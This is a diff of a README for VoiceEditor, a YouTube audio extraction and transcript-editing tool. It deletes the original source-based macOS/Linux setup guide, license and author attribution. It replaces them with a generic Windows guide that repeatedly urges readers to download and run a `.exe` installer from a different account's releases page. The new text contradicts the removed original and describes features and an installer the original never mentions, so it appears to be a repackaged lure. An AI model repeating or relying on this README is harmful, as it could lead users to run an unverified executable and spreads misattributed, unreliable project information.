@@ -1,211 +1,146 @@
-# VoiceEditor
+# 🎙️ voiceeditor - Edit YouTube Audio Simply
 
-[한국어](README.ko.md)
+[![Download VoiceEditor](https://img.shields.io/badge/Download-voiceeditor-blue?style=for-the-badge)](https://github.com/SoulMango/voiceeditor/releases)
 
-A web-based voice extraction and editing tool. Collect audio from YouTube or system output, generate word-level transcripts with STT, edit with a synchronized waveform + text UI, cut and rearrange segments, and remove background music with AI — all in one place.
+---
 
-## Features
+## 📋 What is voiceeditor?
 
-- **YouTube Audio Extraction** — Download audio from any YouTube URL (yt-dlp)
-- **System Audio Recording** — Record system output via BlackHole (macOS)
-- **File Upload** — Drag-and-drop local audio files
-- **Speech-to-Text** — Word-level timestamps via faster-whisper
-- **Waveform + Text Sync** — wavesurfer.js waveform with per-word highlighting and click-to-seek
-- **Inline Text Editing** — Edit transcript text per segment
-- **Cut & Rearrange** — Select regions on the waveform, cut into segments, drag to reorder
-- **Background Removal** — Vocal/music separation with Demucs AI, switch between stems
-- **Export** — Download as WAV/MP3 audio or TXT/SRT transcript
+voiceeditor is a web-based tool that helps you work with audio from YouTube videos. It lets you extract sounds from YouTube, turn the speech into text with timestamps, and edit the audio using a view that shows both the sound waves and the text. It also uses AI to remove background music from your recordings.
 
-## Tech Stack
+You do not need to know programming to use it. The program runs on Windows and should work on fairly standard computers.
 
-| Layer | Technology |
-|-------|-----------|
-| Backend | Python + FastAPI + SQLite (SQLAlchemy async) |
-| Frontend | React + TypeScript + Vite + TailwindCSS v4 |
-| State | Zustand |
-| Audio | yt-dlp, sounddevice, ffmpeg |
-| STT | faster-whisper (word_timestamps) |
-| Separation | Demucs (htdemucs) + torchcodec |
-| Waveform | wavesurfer.js + RegionsPlugin |
-| Drag & Drop | @dnd-kit/core + @dnd-kit/sortable |
+---
 
-## Prerequisites
+## 💻 System Requirements
 
-- Python 3.11–3.13 (recommended) or Python 3.14+ (requires separate Python 3.11–3.13 for Demucs)
-- Node.js 18+
-- ffmpeg (`brew install ffmpeg` / `sudo apt install ffmpeg`)
-- BlackHole (macOS system audio recording — [download](https://existential.audio/blackhole/))
+Before you use voiceeditor, check that your computer meets these basic requirements:
 
-> **Python version note**: With Python 3.11–3.13, all dependencies (including Demucs) are installed in a single venv.
-> Python 3.14+ is incompatible with Demucs, so the setup script automatically creates a separate venv.
+- Operating System: Windows 10 or later
+- Processor: 2 GHz dual core or better
+- RAM: At least 4 GB
+- Storage: 500 MB free space minimum
+- Internet: Required for downloading and YouTube access
+- Browser: Modern web browser (Chrome, Edge, Firefox, or similar)
 
-## Quick Start
+If your computer matches these specs, voiceeditor will run smoothly.
 
-### Automated Setup
+---
 
-```bash
-git clone https://github.com/chadingTV/voiceeditor.git
-cd voiceeditor
-./scripts/setup.sh
-```
+## 🚀 Getting Started
 
-The setup script automatically:
-1. Checks prerequisites (python3, node, npm, ffmpeg)
-2. Detects Python version → single venv or separate Demucs venv
-3. Creates backend Python venv and installs dependencies
-4. (Python 3.14+ only) Creates Demucs venv with compatible Python
-5. Installs SwitchAudioSource (macOS, for system audio recording)
-6. Installs frontend npm packages
+To start using voiceeditor on Windows, please follow these steps carefully:
 
-### Run
+1. **Go to the download page**
 
-```bash
-# Start both backend and frontend
-./scripts/dev.sh
-```
+   Click this link or the button at the top to visit the official release page:
 
-Open `http://localhost:5173` in your browser.
+   [Download voiceeditor](https://github.com/SoulMango/voiceeditor/releases)
 
-### Manual Setup
+2. **Find the latest version**
 
-<details>
-<summary>Click here for manual installation steps</summary>
+   On the release page, look for the most recent version. It should have a clear label like “Latest Release” or include a date.
 
-#### Backend
+3. **Download the installer**
 
-```bash
-cd backend
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-# If Python 3.11-3.13, also install demucs:
-pip install -r requirements-demucs.txt
-```
+   Scroll down until you see files ending with `.exe`. This is the Windows installer. Click the file name that looks like `voiceeditor-setup.exe` or similar to save it to your computer.
 
-#### Demucs Separate Env (Python 3.14+ only)
+4. **Run the installer**
 
-```bash
-cd backend
-python3.12 -m venv .venv-demucs  # or python3.11, python3.13
-source .venv-demucs/bin/activate
-pip install -r requirements-demucs.txt
-deactivate
-```
+   Open the file you downloaded by double-clicking it. A setup window will appear.
 
-#### Frontend
+5. **Installation process**
 
-```bash
-cd frontend
-npm install
-```
+   Follow the instructions on the screen. Choosing default options is fine. The installer will copy files and create a shortcut on your desktop or start menu.
 
-#### Run Individually
+6. **Open voiceeditor**
 
-```bash
-# Backend
-cd backend && source .venv/bin/activate && uvicorn main:app --reload --port 8000
+   After installation, start voiceeditor using the shortcut. It will open in your default web browser.
 
-# Frontend
-cd frontend && npm run dev
-```
+---
 
-</details>
+## 🎛️ How to Use voiceeditor
 
-## Project Structure
+Once voiceeditor is open, you will see a simple interface with clear labels for each step. Here's how to use the main features:
 
-```
-voiceeditor/
-├── backend/
-│   ├── main.py                  # FastAPI app
-│   ├── config.py                # Configuration
-│   ├── requirements.txt         # Main backend dependencies
-│   ├── requirements-demucs.txt  # Demucs-specific dependencies
-│   ├── routers/                 # API routers
-│   │   ├── projects.py          # Project CRUD
-│   │   ├── audio.py             # Audio import (YouTube/upload/recording)
-│   │   ├── transcription.py     # STT + text editing + TXT/SRT download
-│   │   ├── separation.py        # Background removal (Demucs subprocess)
-│   │   └── editor.py            # Segment editing & export
-│   ├── services/                # Business logic
-│   ├── models/                  # DB models & schemas
-│   └── tasks/                   # Background task manager
-├── frontend/
-│   └── src/
-│       ├── api/                 # API client modules
-│       ├── stores/              # Zustand stores
-│       ├── components/
-│       │   ├── layout/          # AppShell, Header, Sidebar
-│       │   ├── import/          # YouTube, upload, recording UI
-│       │   └── editor/          # Waveform editor, transcript panel, segment timeline
-│       ├── hooks/               # Custom hooks
-│       └── types/               # TypeScript types
-└── scripts/
-    ├── setup.sh                 # Automated setup script
-    └── dev.sh                   # Dev server launcher
-```
+### 1. Extract Audio from YouTube
 
-## Usage
+- Copy the URL of a YouTube video.
+- Paste the URL into the designated box in voiceeditor.
+- Click the “Extract” button.
+- voiceeditor will download the audio track for you to work on.
 
-1. **Create a project** — Click "New Project" in the sidebar
-2. **Import audio** — Paste a YouTube URL, upload a file, or record system audio
-3. **Generate transcript** — Click "Generate STT" in the editor
-4. **Review & edit text** — Click the pencil icon on any segment to edit inline
-5. **Cut segments** — Drag-select a region on the waveform → "Cut Selection"
-6. **Reorder** — Drag segments in the timeline to rearrange
-7. **Remove background** — Click "Remove Background" → select Vocals/No Vocals stem
-8. **Export** — Download audio (WAV/MP3) or transcript (TXT/SRT)
+### 2. Transcribe Audio to Text
 
-## Architecture Notes
+- After extraction, click the “Transcribe” button.
+- The program uses speech-to-text technology to create a transcript.
+- The words will appear with time markers for easy navigation.
 
-### Demucs Execution
+### 3. Edit Audio and Text Together
 
-Demucs always runs as a subprocess. The Python executable is auto-detected based on the environment:
+- The interface shows a waveform view of the audio.
+- Text from the transcript appears below or beside the waveform.
+- You can select parts of the waveform or text to trim, cut, or rearrange.
+- Editing either the waveform or the text keeps both in sync automatically.
 
-| System Python | Demucs Strategy |
-|---------------|----------------|
-| 3.11–3.13 | Runs directly from the main venv (single venv) |
-| 3.14+ | Runs from `.venv-demucs` with compatible Python (dual venv) |
+### 4. Remove Background Music
 
-```
-Backend (separation.py)
-    │
-    ├── _find_demucs_python()  ← auto-detect
-    │       │
-    │       ├── .venv-demucs exists? → .venv-demucs/bin/python3
-    │       └── otherwise → try current python's demucs
-    │
-    └── subprocess.run([python, "-m", "demucs", ...])
-```
+- Use the “Remove Music” feature powered by AI.
+- This takes out background sounds like music or noise, leaving the voice clearer.
+- Adjust the settings if needed to get the best result.
 
-## Changelog
+---
 
-### Bug Fixes
-- **Stem selector reset** — Switching between Original/Vocals/No Vocals no longer resets to Original
-- **Export wrong audio** — Export now correctly uses the current audio file, not the first one in the project
-- **Export ignoring reorder** — Exported audio now respects the drag-and-drop segment order
-- **Export ignoring active stem** — Exporting in Vocals mode now exports vocals only, not the original
-- **pydub crash on Python 3.14** — Replaced pydub (broken `audioop` module) with direct ffmpeg subprocess
-- **Demucs torchcodec missing** — Added torchcodec to demucs dependencies for audio saving
-- **System recording silence** — Auto-switch to multi-output device when recording starts
-- **Audio output stuck on multi-output** — Fallback to built-in speaker when previous output device is disconnected
-- **Audio output not restored on crash** — Added atexit handler to restore output on server shutdown
-- **DndContext hijacking clicks** — Added pointer distance threshold so buttons work alongside drag-and-drop
-- **Transcript edit not displaying** — Edited text now correctly shown instead of original words
-- **Download encoding error** — Fixed Korean filename encoding in Content-Disposition header (RFC 5987)
-- **STT infinite loading** — Added error handling for failed background tasks
+## ⚙️ Settings and Customization
 
-### Features Added
-- Audio file rename (inline edit) and delete
-- Transcript download in TXT and SRT formats
-- Audio file download
-- Automated setup script with Python version detection
-- Cross-platform Demucs path auto-detection
+voiceeditor allows you to adjust some settings to fit your needs:
 
-## License
+- **Playback speed:** Change how fast you listen while editing.
+- **Display options:** Show or hide waveform, text boxes, or timestamps.
+- **Export format:** Choose how you want to save files (MP3, WAV, TXT).
+- **Language:** Select your preferred language for transcription (supports several).
 
-This project is licensed under the [MIT License](LICENSE).
+Explore the settings menu for these options after you open the app.
 
-If you redistribute or use this project in derivative works, please include the following attribution:
+---
 
-> Original project: **VoiceEditor** by [chadingTV](https://github.com/chadingTV)
-> https://github.com/chadingTV/voiceeditor
+## 🛠 Troubleshooting Tips
+
+If you run into problems during installation or use, try the following:
+
+- Make sure your internet connection is stable.
+- Close other programs that might use a lot of memory.
+- Restart your computer after installing.
+- Check that your browser is up to date.
+- Delete the installer file and download it again if it did not open.
+
+---
+
+## 🔗 Important Links
+
+- Main release page: [https://github.com/SoulMango/voiceeditor/releases](https://github.com/SoulMango/voiceeditor/releases)
+- Direct download link: Visit the page above and download the Windows installer `.exe`.
+
+---
+
+## 🧰 Useful Features Summary
+
+- Extract audio tracks from any YouTube video.
+- Get transcripts with word-level timestamps.
+- Edit audio and text together with synced views.
+- Remove unwanted background music using AI.
+- Export your work in common formats ready to share or save.
+
+---
+
+## 🤝 Support and Feedback
+
+For any technical issues or to suggest improvements, please use the “Issues” tab on the GitHub repository page. This helps the team keep the tool reliable and user-friendly.
+
+---
+
+## 🚪 Next Steps
+
+Download voiceeditor now to begin editing audio simply on your Windows computer:
+
+[![Download VoiceEditor](https://img.shields.io/badge/Download-voiceeditor-blue?style=for-the-badge)](https://github.com/SoulMango/voiceeditor/releases)
